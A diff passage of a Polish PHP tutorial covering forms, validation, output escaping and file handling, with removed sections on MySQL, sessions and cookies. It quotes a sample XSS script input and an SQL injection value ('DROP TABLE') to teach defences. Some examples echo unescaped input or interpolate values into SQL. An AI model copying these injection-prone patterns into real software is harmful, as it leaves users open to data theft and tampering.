+    if (isset($_GET["fraza"])) {
+        $fraza = $_GET["fraza"];
+        echo "Szukasz: $fraza";
+    }
+    
+    // URL będzie: szukaj.php?fraza=test
+?>
+```
 
-### Przetwarzanie formularza w PHP
+#### **Porównanie GET vs POST**
+
+| Cecha | GET | POST |
+|-------|-----|------|
+| Widoczność danych | W URL (widoczne) | Ukryte w ciele żądania |
+| Długość danych | Ograniczona (~2000 znaków) | Praktycznie nieograniczona |
+| Bezpieczeństwo | Niższe (dane w historii przeglądarki) | Wyższe |
+| Zakładki | Można zapisać URL z danymi | Nie można |
+| Użycie | Wyszukiwanie, filtrowanie | Formularze, logowanie, rejestracja |
+| Przykład | `szukaj.php?fraza=test` | Dane ukryte |
+
+### **Walidacja danych - BARDZO WAŻNE!**
+
+ZAWSZE waliduj dane od użytkowników!
 
 ```php
 <?php
-// proces.php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // ZAWSZE waliduj i oczyszczaj dane!
-    $imie = htmlspecialchars(trim($_POST['imie']));
-    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
-    $wiek = isset($_POST['wiek']) ? (int)$_POST['wiek'] : 0;
-    $wiadomosc = htmlspecialchars(trim($_POST['wiadomosc']));
-
-    // Walidacja
-    $bledy = [];
-
-    if (empty($imie)) {
-        $bledy[] = "Imię jest wymagane!";
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        
+        $imie = $_POST["imie"];
+        $email = $_POST["email"];
+        $wiek = $_POST["wiek"];
+        
+        $bledy = [];  // Tablica na błędy
+        
+        // 1. Sprawdzenie czy pole nie jest puste
+        if (empty($imie)) {
+            $bledy[] = "Imię jest wymagane";
+        }
+        
+        // 2. Sprawdzenie długości
+        if (strlen($imie) < 3) {
+            $bledy[] = "Imię musi mieć co najmniej 3 znaki";
+        }
+        
+        if (strlen($imie) > 50) {
+            $bledy[] = "Imię może mieć maksymalnie 50 znaków";
+        }
+        
+        // 3. Walidacja email
+        if (empty($email)) {
+            $bledy[] = "Email jest wymagany";
+        } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+            $bledy[] = "Nieprawidłowy format email";
+        }
+        
+        // 4. Sprawdzenie czy wiek jest liczbą
+        if (!is_numeric($wiek)) {
+            $bledy[] = "Wiek musi być liczbą";
+        } elseif ($wiek < 1 || $wiek > 150) {
+            $bledy[] = "Wiek musi być w przedziale 1-150";
+        }
+        
+        // 5. Wyświetlenie błędów lub przetworzenie danych
+        if (count($bledy) > 0) {
+            echo "<h3>Znaleziono błędy:</h3><ul>";
+            foreach ($bledy as $blad) {
+                echo "<li>$blad</li>";
+            }
+            echo "</ul>";
+        } else {
+            echo "<h3>Dane są poprawne!</h3>";
+            // Tutaj możesz zapisać dane do bazy
+        }
     }
+?>
+```
 
-    if (!$email) {
-        $bledy[] = "Niepoprawny email!";
+### **Zabezpieczanie danych - htmlspecialchars()**
+
+**ZAWSZE** używaj `htmlspecialchars()` przy wyświetlaniu danych od użytkowników!
+
+```php
+<?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        
+        // ŹLE - podatne na XSS!
+        $komentarz = $_POST["komentarz"];
+        echo $komentarz;  // Jeśli użytkownik wpisze <script>alert('XSS')</script>, wykona się!
+        
+        // DOBRZE - bezpieczne
+        $komentarz = htmlspecialchars($_POST["komentarz"]);
+        echo $komentarz;  // Tagi HTML zostaną zamienione na tekst
     }
+?>
+```
 
-    if ($wiek < 0 || $wiek > 120) {
-        $bledy[] = "Niepoprawny wiek!";
-    }
+### **Przykład: Kompletny formularz kontaktowy**
 
-    // Wyświetlenie błędów lub potwierdzenia
-    if (!empty($bledy)) {
-        foreach ($bledy as $blad) {
-            echo "<p style='color: red;'>$blad</p>";
+**formularz.html:**
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Formularz kontaktowy</title>
+    <style>
+        .error { color: red; }
+        .success { color: green; }
+        label { display: block; margin-top: 10px; }
+        input, textarea { width: 300px; padding: 5px; }
+        button { margin-top: 15px; padding: 10px 20px; }
+    </style>
+</head>
+<body>
+    <h2>Formularz kontaktowy</h2>
+    
+    <form method="POST" action="kontakt.php">
+        <label>Imię i nazwisko: *</label>
+        <input type="text" name="imie" required>
+        
+        <label>Email: *</label>
+        <input type="email" name="email" required>
+        
+        <label>Temat: *</label>
+        <input type="text" name="temat" required>
+        
+        <label>Wiadomość: *</label>
+        <textarea name="wiadomosc" rows="5" required></textarea>
+        
+        <button type="submit">Wyślij wiadomość</button>
+    </form>
+</body>
+</html>
+```
+
+**kontakt.php:**
+```php
+<?php
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        
+        // Odbieranie i czyszczenie danych
+        $imie = trim($_POST["imie"]);
+        $email = trim($_POST["email"]);
+        $temat = trim($_POST["temat"]);
+        $wiadomosc = trim($_POST["wiadomosc"]);
+        
+        $bledy = [];
+        
+        // Walidacja
+        if (empty($imie) || strlen($imie) < 3) {
+            $bledy[] = "Imię i nazwisko musi mieć co najmniej 3 znaki";
+        }
+        
+        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
+            $bledy[] = "Nieprawidłowy adres email";
+        }
+        
+        if (empty($temat) || strlen($temat) < 5) {
+            $bledy[] = "Temat musi mieć co najmniej 5 znaków";
+        }
+        
+        if (empty($wiadomosc) || strlen($wiadomosc) < 10) {
+            $bledy[] = "Wiadomość musi mieć co najmniej 10 znaków";
+        }
+        
+        // Wyświetlenie wyniku
+        if (count($bledy) > 0) {
+            echo "<div class='error'>";
+            echo "<h3>Formularz zawiera błędy:</h3><ul>";
+            foreach ($bledy as $blad) {
+                echo "<li>$blad</li>";
+            }
+            echo "</ul></div>";
+            echo "<a href='formularz.html'>Wróć do formularza</a>";
+        } else {
+            // Zabezpieczenie danych
+            $imie = htmlspecialchars($imie);
+            $email = htmlspecialchars($email);
+            $temat = htmlspecialchars($temat);
+            $wiadomosc = htmlspecialchars($wiadomosc);
+            
+            echo "<div class='success'>";
+            echo "<h3>Wiadomość wysłana pomyślnie!</h3>";
+            echo "<p><strong>Od:</strong> $imie ($email)</p>";
+            echo "<p><strong>Temat:</strong> $temat</p>";
+            echo "<p><strong>Wiadomość:</strong><br>$wiadomosc</p>";
+            echo "</div>";
+            
+            // Tutaj możesz wysłać email lub zapisać do bazy
         }
     } else {
-        echo "<p style='color: green;'>Formularz wysłany poprawnie!</p>";
-
-        // Tutaj można zapisać dane do bazy danych
-        // lub wysłać email itp.
+        echo "Nieprawidłowe żądanie";
     }
-}
 ?>
 ```
 
-<div style="background-color: #FFEBEE; border-left: 5px solid #F44336; padding: 10px;">
-<h4 style="margin-top: 0;">🛡️ Bezpieczeństwo formularzy</h4>
-<p>Nigdy nie ufaj danym przesyłanym przez użytkowników! Zawsze:</p>
-<ul style="color: #333333;">
-<li>Waliduj wszystkie dane (czy mają poprawny format)</li>
-<li>Sanityzuj dane (usuwaj niebezpieczne znaki)</li>
-<li>Używaj <code>htmlspecialchars()</code> przed wyświetleniem</li>
-<li>Konwertuj wartości na odpowiednie typy (np. <code>(int)</code> dla liczb)</li>
-</ul>
-</div>
-
----
-
-## **9. Praca z bazą danych - Trwałe przechowywanie danych**
-
-<div style="background-color: #F3E5F5; border-left: 5px solid #9C27B0; padding: 10px;">
-<p style="color: #333333;">Bazy danych są niezbędne do przechowywania trwałych informacji w aplikacjach. PHP doskonale współpracuje z MySQL, najpopularniejszą bazą danych webową.</p>
-</div>
-
-### Dlaczego potrzebujemy baz danych?
-
-<table>
-  <tr>
-    <td width="50px" align="center">💾</td>
-    <td><b>Trwałe przechowywanie:</b> Dane nie znikają po zakończeniu skryptu</td>
-  </tr>
-  <tr>
-    <td align="center">🔍</td>
-    <td><b>Szybkie wyszukiwanie:</b> Efektywne przeszukiwanie dużych zbiorów danych</td>
-  </tr>
-  <tr>
-    <td align="center">🔒</td>
-    <td><b>Bezpieczeństwo:</b> Kontrola dostępu i ochrona danych</td>
-  </tr>
-  <tr>
-    <td align="center">🔄</td>
-    <td><b>Spójność danych:</b> Transakcje i relacje między danymi</td>
-  </tr>
-</table>
-
-### Połączenie z bazą danych MySQL
-
-```php
-<?php
-$host = "localhost";        // Adres serwera bazy danych
-$username = "root";         // Nazwa użytkownika MySQL
-$password = "";             // Hasło (domyślnie puste w XAMPP)
-$database = "moja_baza";    // Nazwa bazy danych
-
-// Utworzenie połączenia
-$conn = new mysqli($host, $username, $password, $database);
-
-// Sprawdzenie połączenia
-if ($conn->connect_error) {
-    die("❌ Błąd połączenia: " . $conn->connect_error);
-}
-echo "✅ Połączenie z bazą danych udane!";
-?>
-```
-
-<div style="background-color: #E3F2FD; border-left: 5px solid #2196F3; padding: 10px;">
-<h4 style="margin-top: 0;">💡 Porada profesjonalisty</h4>
-<p style="color: #333333;">W rzeczywistych aplikacjach dane połączenia przechowuj w osobnym pliku konfiguracyjnym, który można łatwo zmienić bez modyfikacji kodu.</p>
-</div>
-
-### Operacje CRUD - Podstawowe operacje na danych
-
-<img src="https://i.imgur.com/BVfiiUL.png" width="100%" alt="Diagram operacji CRUD">
-
-#### Create (Dodawanie) - Zapisywanie nowych danych
-
-```php
-<?php
-// Przygotowanie danych
-$imie = "Jan";
-$email = "jan@example.com";
-$wiek = 28;
-
-// Zapytanie SQL do dodania rekordu
-$sql = "INSERT INTO uzytkownicy (imie, email, wiek)
-        VALUES ('$imie', '$email', $wiek)";
-
-// Wykonanie zapytania
-if ($conn->query($sql) === TRUE) {
-    echo "✅ Nowy rekord dodany pomyślnie. ID: " . $conn->insert_id;
-} else {
-    echo "❌ Błąd: " . $conn->error;
-}
-?>
-```
-
-#### Read (Odczyt) - Pobieranie danych z bazy
-
-```php
-<?php
-// Zapytanie SELECT
-$sql = "SELECT id, imie, email, wiek FROM uzytkownicy";
-$result = $conn->query($sql);
-
-// Sprawdzenie wyników
-if ($result->num_rows > 0) {
-    echo "<table border='1'>
-    <tr><th>ID</th><th>Imię</th><th>Email</th><th>Wiek</th></tr>";
-
-    // Iteracja przez wyniki
-    while($row = $result->fetch_assoc()) {
-        echo "<tr>
-            <td>" . $row["id"] . "</td>
-            <td>" . $row["imie"] . "</td>
-            <td>" . $row["email"] . "</td>
-            <td>" . $row["wiek"] . "</td>
-        </tr>";
-    }
-    echo "</table>";
-} else {
-    echo "Brak wyników";
-}
-?>
-```
-
-#### Update (Aktualizacja) - Modyfikacja istniejących danych
-
-```php
-<?php
-// Przygotowanie danych
-$id = 5; // ID użytkownika do zaktualizowania
-$nowyEmail = "nowy@example.com";
-$nowyWiek = 30;
-
-// Zapytanie UPDATE
-$sql = "UPDATE uzytkownicy
-        SET email='$nowyEmail', wiek=$nowyWiek
-        WHERE id=$id";
-
-// Wykonanie zapytania
-if ($conn->query($sql) === TRUE) {
-    echo "✅ Rekord zaktualizowany pomyślnie";
-} else {
-    echo "❌ Błąd aktualizacji: " . $conn->error;
-}
-?>
-```
-
-#### Delete (Usuwanie) - Usuwanie rekordów
-
-```php
-<?php
-// ID użytkownika do usunięcia
-$id = 5;
-
-// Zapytanie DELETE
-$sql = "DELETE FROM uzytkownicy WHERE id=$id";
-
-// Wykonanie zapytania
-if ($conn->query($sql) === TRUE) {
-    echo "✅ Rekord usunięty pomyślnie";
-} else {
-    echo "❌ Błąd usuwania: " . $conn->error;
-}
-
-// Zamknięcie połączenia po zakończeniu pracy
-$conn->close();
-?>
-```
-
-### Bezpieczne zapytania - Ochrona przed SQL Injection
-
-<div style="background-color: #FFEBEE; border-left: 5px solid #F44336; padding: 10px;">
-<h4 style="margin-top: 0;">⚠️ Zagrożenie: SQL Injection</h4>
-<p style="color: #333333;">SQL Injection to atak, w którym złośliwy użytkownik wstrzykuje kod SQL do zapytania, co może prowadzić do:</p>
-<ul style="color: #333333;">
-<li>Nieautoryzowanego dostępu do danych</li>
-<li>Usunięcia całej bazy danych</li>
-<li>Przejęcia kontroli nad serwerem</li>
-</ul>
-</div>
-
-#### Używanie Prepared Statements - Bezpieczne rozwiązanie
-
-```php
-<?php
-// Przygotowanie danych (potencjalnie niebezpiecznych)
-$imie = "Jan'; DROP TABLE uzytkownicy; --"; // Próba ataku
-$email = "jan@example.com";
-
-// Bezpieczne zapytanie używające Prepared Statement
-$stmt = $conn->prepare("INSERT INTO uzytkownicy (imie, email) VALUES (?, ?)");
-$stmt->bind_param("ss", $imie, $email); // "ss" oznacza dwa stringi
-
-// Wykonanie bezpiecznego zapytania
-$stmt->execute();
-echo "✅ Dodano rekord bezpiecznie. ID: " . $conn->insert_id;
-$stmt->close();
-?>
-```
-
-<table>
-  <tr>
-    <th>Zwykłe zapytanie</th>
-    <th>Prepared Statement</th>
-  </tr>
-  <tr>
-    <td>❌ Podatne na SQL Injection</td>
-    <td>✅ Bezpieczne - dane nie są częścią zapytania</td>
-  </tr>
-  <tr>
-    <td>❌ Wymaga ręcznego eskejpowania danych</td>
-    <td>✅ Automatyczne eskejpowanie wartości</td>
-  </tr>
-  <tr>
-    <td>❌ Trudniejsze w debugowaniu</td>
-    <td>✅ Czytelniejszy kod, łatwiejszy w utrzymaniu</td>
-  </tr>
-</table>
-
----
-
-## **9. Sesje i ciasteczka - Zapamiętywanie użytkownika**
-
-<div style="background-color: #F1F8E9; border-left: 5px solid #8BC34A; padding: 10px;">
-<p style="color: #333333;">Sesje i ciasteczka to mechanizmy pozwalające na przechowywanie danych o użytkownikach pomiędzy kolejnymi żądaniami HTTP. Dzięki nim, aplikacja może "pamiętać" użytkownika i jego preferencje.</p>
-</div>
-
-### Sesje - Przechowywanie danych po stronie serwera
-
-```php
-<?php
-// Rozpoczęcie sesji - MUSI być na początku pliku
-session_start();
-
-// Zapisywanie danych w sesji
-$_SESSION["user_id"] = 123;
-$_SESSION["username"] = "jan_kowalski";
-$_SESSION["is_admin"] = false;
-$_SESSION["last_login"] = time();
-
-echo "Utworzono sesję dla użytkownika: " . $_SESSION["username"];
-?>
-```
-
-```php
-<?php
-// Na innej stronie - odczytywanie danych z sesji
-session_start();
-
-// Sprawdzanie czy użytkownik jest zalogowany
-if (isset($_SESSION["user_id"])) {
-    echo "Witaj ponownie, " . $_SESSION["username"];
-    echo "Ostatnie logowanie: " . date("Y-m-d H:i:s", $_SESSION["last_login"]);
-} else {
-    echo "Nie jesteś zalogowany. <a href='login.php'>Zaloguj się</a>";
-}
-?>
-```
-
-#### Usuwanie sesji - wylogowanie użytkownika
-
-```php
-<?php
-session_start();
-
-// Usunięcie wszystkich zmiennych sesji
-$_SESSION = array();
-
-// Usunięcie ciasteczka sesji
-if (ini_get("session.use_cookies")) {
-    $params = session_get_cookie_params();
-    setcookie(session_name(), '', time() - 42000,
-        $params["path"], $params["domain"],
-        $params["secure"], $params["httponly"]
-    );
-}
-
-// Zniszczenie sesji
-session_destroy();
-
-echo "Zostałeś wylogowany pomyślnie!";
-?>
-```
-
-### Ciasteczka (Cookies) - Pamięć po stronie klienta
-
-<div style="background-color: #FFF3E0; border-left: 5px solid #FF9800; padding: 10px;">
-<p style="color: #333333;">Ciasteczka to małe pliki tekstowe przechowywane w przeglądarce użytkownika. Mogą trwać dłużej niż sesja i są dostępne na wielu podstronach.</p>
-</div>
-
-#### Ustawianie ciasteczek
-
-```php
-<?php
-// Ciasteczko ważne 30 dni (czas w sekundach)
-setcookie(
-    "user_preferences",           // nazwa ciasteczka
-    "dark_theme,pl_language",     // wartość
-    time() + (30 * 24 * 60 * 60), // czas ważności (30 dni)
-    "/",                          // ścieżka na serwerze
-    "",                           // domena (pusta = aktualna)
-    false,                        // secure (true = tylko HTTPS)
-    true                          // httponly (true = niedostępne dla JS)
-);
-
-// Proste ciasteczko zapamietujące ostatnią wizytę
-setcookie("last_visit", date("Y-m-d H:i:s"), time() + (365 * 24 * 60 * 60));
-
-echo "Ciasteczka ustawione!";
-?>
-```
-
-#### Odczytywanie ciasteczek
-
-```php
-<?php
-// Odczytywanie ciasteczek
-if (isset($_COOKIE["user_preferences"])) {
-    $preferencje = $_COOKIE["user_preferences"];
-    $ustawienia = explode(",", $preferencje);
-
-    $motyw = $ustawienia[0]; // dark_theme
-    $jezyk = $ustawienia[1]; // pl_language
-
-    echo "Twoje preferencje: Motyw - $motyw, Język - $jezyk";
-}
-
-if (isset($_COOKIE["last_visit"])) {
-    echo "Twoja ostatnia wizyta: " . $_COOKIE["last_visit"];
-} else {
-    echo "To Twoja pierwsza wizyta!";
-}
-?>
-```
-
-#### Usuwanie ciasteczek
-
-```php
-<?php
-// Usunięcie ciasteczka - ustawienie daty ważności w przeszłości
-setcookie("user_preferences", "", time() - 3600); // -1 godzina
-echo "Ciasteczko user_preferences zostało usunięte.";
-?>
-```
-
-<table>
-  <tr>
-    <th width="150px">Cecha</th>
-    <th>Sesje</th>
-    <th>Ciasteczka</th>
-  </tr>
-  <tr>
-    <td>Miejsce przechowywania</td>
-    <td>Serwer (tylko ID sesji u klienta)</td>
-    <td>Przeglądarka klienta</td>
-  </tr>
-  <tr>
-    <td>Bezpieczeństwo</td>
-    <td>✅ Wyższe - dane nie są dostępne dla klienta</td>
-    <td>❌ Niższe - dane mogą być modyfikowane</td>
-  </tr>
-  <tr>
-    <td>Czas życia</td>
-    <td>Do zamknięcia przeglądarki (domyślnie)</td>
-    <td>Możliwe wielomiesięczne przechowywanie</td>
-  </tr>
-  <tr>
-    <td>Rozmiar danych</td>
-    <td>Praktycznie nieograniczony</td>
-    <td>Ograniczony (zwykle 4KB)</td>
-  </tr>
-  <tr>
-    <td>Zastosowanie</td>
-    <td>Dane logowania, koszyki, dane wrażliwe</td>
-    <td>Preferencje, śledzenie, ustawienia UI</td>
-  </tr>
-</table>
-
----
-
-## **10. Obsługa plików - Praca z systemem plików**
-
-<div style="background-color: #E8F5E9; border-left: 5px solid #3F51B5; padding: 10px;">
-<p style="color: #333333;">PHP umożliwia pełną manipulację plikami na serwerze - odczytywanie, zapisywanie, kopiowanie czy usuwanie plików. To niezbędne do wielu praktycznych zastosowań.</p>
-</div>
-
-### Przydatne funkcje plików
-
-<table>
-  <tr>
-    <th>Operacja</th>
-    <th>Funkcja</th>
-    <th>Przykład</th>
-  </tr>
-  <tr>
-    <td>Odczyt całego pliku</td>
-    <td><code>file_get_contents()</code></td>
-    <td><code>$tekst = file_get_contents("plik.txt");</code></td>
-  </tr>
-  <tr>
-    <td>Zapis do pliku</td>
-    <td><code>file_put_contents()</code></td>
-    <td><code>file_put_contents("plik.txt", "Nowa zawartość");</code></td>
-  </tr>
-  <tr>
-    <td>Dopisanie do pliku</td>
-    <td><code>file_put_contents()</code> z flagą</td>
-    <td><code>file_put_contents("log.txt", "Nowy wpis\n", FILE_APPEND);</code></td>
-  </tr>
-  <tr>
-    <td>Sprawdzenie istnienia</td>
-    <td><code>file_exists()</code></td>
-    <td><code>if (file_exists("plik.txt")) { /* kod */ }</code></td>
-  </tr>
-  <tr>
-    <td>Usunięcie pliku</td>
-    <td><code>unlink()</code></td>
-    <td><code>unlink("stary-plik.txt");</code></td>
-  </tr>
-</table>
-
-### Zaawansowana praca z plikami
-
-```php
-<?php
-// Otwarcie pliku w trybie odczytu
-$file = fopen("plik.txt", "r");
-
-// Odczyt linia po linii (oszczędność pamięci przy dużych plikach)
-if ($file) {
-    while (($line = fgets($file)) !== false) {
-        echo "Linia: " . htmlspecialchars($line) . "<br>";
-    }
-    fclose($file); // Ważne - zamykanie pliku
-} else {
-    echo "❌ Nie można otworzyć pliku";
-}
-?>
-```
-
-<div style="background-color: #E3F2FD; border-left: 5px solid #2196F3; padding: 10px; margin: 15px 0;">
-<h4 style="margin-top: 0;">💡 Przydatne tryby otwarcia pliku</h4>
-<ul style="color: #333333;">
-<li><code>"r"</code> - Tylko do odczytu</li>
-<li><code>"w"</code> - Tylko do zapisu (tworzy nowy plik lub usuwa zawartość)</li>
-<li><code>"a"</code> - Dopisywanie (zachowuje zawartość)</li>
-<li><code>"r+"</code> - Odczyt i zapis</li>
-<li><code>"w+"</code> - Odczyt i zapis (tworzy nowy plik lub usuwa zawartość)</li>
-</ul>
-</div>
-
-### Praktyczne zastosowania operacji plikowych
-
-```php
-<?php
-// 1. Logowanie zdarzeń do pliku
-function log_event($message) {
-    $timestamp = date("Y-m-d H:i:s");
-    $log_entry = "[$timestamp] $message\n";
-    return file_put_contents("logs/app.log", $log_entry, FILE_APPEND);
-}
-
-log_event("Użytkownik zalogował się.");
-log_event("Wystąpił błąd połączenia z bazą danych!");
-
-// 2. Odczyt pliku CSV
-$users = [];
-if (($handle = fopen("users.csv", "r")) !== FALSE) {
-    // Pominięcie wiersza nagłówkowego
-    fgetcsv($handle);
-
-    // Odczyt danych
-    while (($data = fgetcsv($handle)) !== FALSE) {
-        $users[] = [
-            'id' => $data[0],
-            'name' => $data[1],
-            'email' => $data[2]
-        ];
-    }
-    fclose($handle);
-
-    // Użycie danych
-    foreach ($users as $user) {
-        echo "Użytkownik: " . $user['name'] . "<br>";
-    }
-}
-?>
-```
-
-<div style="background-color: #FFF3CD; border-left: 5px solid #FFC107; padding: 10px;">
-<h4 style="margin-top: 0;">⚠️ Uwagi dotyczące bezpieczeństwa</h4>
-<ul style="color: #333333;">
-<li>Zawsze sprawdzaj uprawnienia plików i folderów</li>
-<li>Nigdy nie przechowuj wrażliwych danych (hasła, klucze API) w plikach publicznie dostępnych</li>
-<li>Limituj dostęp do operacji plikowych dla zwykłych użytkowników</li>
-<li>Zawsze sprawdzaj czy operacja się powiodła przed kontynuowaniem</li>
-</ul>
-</div>
-
----
-
-## **11. Upload plików - Przyjmowanie plików od użytkowników**
-
-<div style="background-color: #FFEBEE; border-left: 5px solid #F44336; padding: 10px;">
-<h4 style="margin-top: 0;">🔒 Bezpieczeństwo to priorytet!</h4>
-<p style="color: #333333;">Upload plików to jedna z najbardziej wrażliwych funkcjonalności strony internetowej pod względem bezpieczeństwa. Nieodpowiednio zabezpieczony upload może prowadzić do poważnych luk.</p>
-</div>
-
-### Formularz HTML do uploadu plików
+### **Pozostałe typy pól formularza**
 
 ```html
-<!-- enctype="multipart/form-data" jest NIEZBĘDNY dla formularzy z plikami -->
-<form action="upload.php" method="POST" enctype="multipart/form-data">
-  <div>
-    <label>Wybierz plik:</label>
-    <input type="file" name="plik" required />
-  </div>
+<!-- Pole tekstowe wielolinijkowe -->
+<textarea name="opis" rows="5" cols="40"></textarea>
 
-  <div>
-    <label>Opis pliku:</label>
-    <input type="text" name="opis" placeholder="Opis pliku" />
-  </div>
+<!-- Pole wyboru (checkbox) -->
+<input type="checkbox" name="zgoda" value="tak"> Zgadzam się
 
-  <button type="submit">Prześlij plik</button>
+<!-- Przyciski radio -->
+<input type="radio" name="plec" value="mezczyzna"> Mężczyzna
+<input type="radio" name="plec" value="kobieta"> Kobieta
+
+<!-- Lista rozwijana (select) -->
+<select name="miasto">
+    <option value="">Wybierz miasto</option>
+    <option value="warszawa">Warszawa</option>
+    <option value="krakow">Kraków</option>
+    <option value="gdansk">Gdańsk</option>
+</select>
+
+<!-- Pole ukryte -->
+<input type="hidden" name="user_id" value="123">
+
+<!-- Pole hasła -->
+<input type="password" name="haslo">
+
+<!-- Pole daty -->
+<input type="date" name="data_urodzenia">
+
+<!-- Pole koloru -->
+<input type="color" name="kolor">
+
+<!-- Pole pliku -->
+<input type="file" name="zdjecie">
+```
+
+**Odbieranie w PHP:**
+
+```php
+<?php
+    // Textarea
+    $opis = $_POST["opis"];
+    
+    // Checkbox
+    if (isset($_POST["zgoda"])) {
+        echo "Użytkownik zaznaczył zgodę";
+    }
+    
+    // Radio
+    $plec = $_POST["plec"];  // "mezczyzna" lub "kobieta"
+    
+    // Select
+    $miasto = $_POST["miasto"];
+    
+    // Hidden
+    $userId = $_POST["user_id"];
+    
+    // Password
+    $haslo = $_POST["haslo"];
+    
+    // Date
+    $dataUrodzenia = $_POST["data_urodzenia"];  // Format: YYYY-MM-DD
+    
+    // Color
+    $kolor = $_POST["kolor"];  // Format: #rrggbb
+?>
+```
+
+### **Formularze z wielokrotnym wyborem**
+
+```html
+<!-- Checkbox - wiele wartości -->
+<label>Wybierz zainteresowania:</label>
+<input type="checkbox" name="zainteresowania[]" value="sport"> Sport
+<input type="checkbox" name="zainteresowania[]" value="muzyka"> Muzyka
+<input type="checkbox" name="zainteresowania[]" value="film"> Film
+<input type="checkbox" name="zainteresowania[]" value="ksiazki"> Książki
+
+<!-- Select - wielokrotny wybór -->
+<select name="jezyki[]" multiple>
+    <option value="php">PHP</option>
+    <option value="python">Python</option>
+    <option value="javascript">JavaScript</option>
+    <option value="java">Java</option>
+</select>
+```
+
+**Odbieranie w PHP:**
+
+```php
+<?php
+    // Checkboxy - tablica
+    if (isset($_POST["zainteresowania"])) {
+        $zainteresowania = $_POST["zainteresowania"];  // Tablica
+        
+        foreach ($zainteresowania as $zainteresowanie) {
+            echo "- $zainteresowanie<br>";
+        }
+    }
+    
+    // Select multiple - tablica
+    if (isset($_POST["jezyki"])) {
+        $jezyki = $_POST["jezyki"];  // Tablica
+        
+        echo "Wybrane języki: " . implode(", ", $jezyki);
+    }
+?>
+```
+
+---
+
+## **10. Praca z plikami**
+
+PHP pozwala na pełną manipulację plikami na serwerze - odczyt, zapis, modyfikację, usuwanie.
+
+### **Sprawdzanie istnienia pliku**
+
+```php
+<?php
+    if (file_exists("plik.txt")) {
+        echo "Plik istnieje";
+    } else {
+        echo "Plik nie istnieje";
+    }
+    
+    // Sprawdzenie czy to plik czy folder
+    if (is_file("plik.txt")) {
+        echo "To jest plik";
+    }
+    
+    if (is_dir("folder")) {
+        echo "To jest folder";
+    }
+?>
+```
+
+### **Odczyt całego pliku**
+
+```php
+<?php
+    // Sposób 1: file_get_contents() - cały plik jako string
+    $zawartosc = file_get_contents("plik.txt");
+    echo $zawartosc;
+    
+    // Bezpieczniej - sprawdź czy plik istnieje
+    if (file_exists("plik.txt")) {
+        $zawartosc = file_get_contents("plik.txt");
+        echo htmlspecialchars($zawartosc);  // Zabezpieczenie
+    } else {
+        echo "Plik nie istnieje";
+    }
+    
+    // Sposób 2: file() - cały plik jako tablica linii
+    $linie = file("plik.txt");
+    foreach ($linie as $numer => $linia) {
+        echo "Linia " . ($numer + 1) . ": " . htmlspecialchars($linia) . "<br>";
+    }
+?>
+```
+
+### **Zapis do pliku**
+
+```php
+<?php
+    // Sposób 1: file_put_contents() - nadpisuje zawartość
+    $tekst = "To jest nowa zawartość pliku\n";
+    file_put_contents("plik.txt", $tekst);
+    
+    // Sposób 2: file_put_contents() z FILE_APPEND - dopisuje na końcu
+    $nowyTekst = "To zostanie dopisane\n";
+    file_put_contents("plik.txt", $nowyTekst, FILE_APPEND);
+    
+    // Sprawdzenie czy udało się zapisać
+    if (file_put_contents("plik.txt", $tekst) !== false) {
+        echo "Plik zapisany pomyślnie";
+    } else {
+        echo "Błąd zapisu";
+    }
+?>
+```
+
+### **Praca z plikami - tryby fopen()**
+
+```php
+<?php
+    // Tryby otwarcia pliku:
+    // "r"  - Odczyt, wskaźnik na początku
+    // "r+" - Odczyt i zapis, wskaźnik na początku
+    // "w"  - Zapis, tworzy plik lub czyści zawartość
+    // "w+" - Odczyt i zapis, tworzy plik lub czyści zawartość
+    // "a"  - Dopisywanie, wskaźnik na końcu
+    // "a+" - Odczyt i dopisywanie, wskaźnik na końcu
+    
+    // Odczyt pliku linia po linii
+    $plik = fopen("plik.txt", "r");
+    
+    if ($plik) {
+        while (($linia = fgets($plik)) !== false) {
+            echo htmlspecialchars($linia) . "<br>";
+        }
+        fclose($plik);  // WAŻNE! Zawsze zamykaj plik
+    } else {
+        echo "Nie można otworzyć pliku";
+    }
+    
+    // Zapis do pliku
+    $plik = fopen("nowy.txt", "w");
+    
+    if ($plik) {
+        fwrite($plik, "Pierwsza linia\n");
+        fwrite($plik, "Druga linia\n");
+        fwrite($plik, "Trzecia linia\n");
+        fclose($plik);
+        echo "Plik zapisany";
+    }
+?>
+```
+
+### **Praktyczny przykład - licznik odwiedzin**
+
+```php
+<?php
+    $plik = "licznik.txt";
+    
+    // Odczyt aktualnej wartości
+    if (file_exists($plik)) {
+        $licznik = (int)file_get_contents($plik);
+    } else {
+        $licznik = 0;
+    }
+    
+    // Zwiększenie licznika
+    $licznik++;
+    
+    // Zapis nowej wartości
+    file_put_contents($plik, $licznik);
+    
+    echo "Liczba odwiedzin: $licznik";
+?>
+```
+
+### **Operacje na plikach**
+
+```php
+<?php
+    // Kopiowanie pliku
+    copy("zrodlo.txt", "kopia.txt");
+    
+    // Przenoszenie/zmiana nazwy
+    rename("stara_nazwa.txt", "nowa_nazwa.txt");
+    
+    // Usuwanie pliku
+    unlink("plik_do_usuniecia.txt");
+    
+    // Informacje o pliku
+    $rozmiar = filesize("plik.txt");  // Rozmiar w bajtach
+    echo "Rozmiar: " . ($rozmiar / 1024) . " KB";
+    
+    $czas = filemtime("plik.txt");  // Timestamp ostatniej modyfikacji
+    echo "Ostatnia modyfikacja: " . date("Y-m-d H:i:s", $czas);
+?>
+```
+
+### **Praca z katalogami**
+
+```php
+<?php
+    // Tworzenie katalogu
+    if (!file_exists("nowy_folder")) {
+        mkdir("nowy_folder");
+        echo "Folder utworzony";
+    }
+    
+    // Tworzenie zagnieżdżonych katalogów
+    mkdir("folder/podfolder/kolejny", 0777, true);
+    
+    // Usuwanie pustego katalogu
+    rmdir("pusty_folder");
+    
+    // Listowanie plików w katalogu
+    $pliki = scandir(".");  // "." = aktualny katalog
+    
+    foreach ($pliki as $plik) {
+        if ($plik != "." && $plik != "..") {
+            echo "$plik<br>";
+        }
+    }
+    
+    // Lub z glob (z filtrowaniem)
+    $plikiTxt = glob("*.txt");  // Wszystkie pliki .txt
+    foreach ($plikiTxt as $plik) {
+        echo "$plik<br>";
+    }
+?>
+```
+
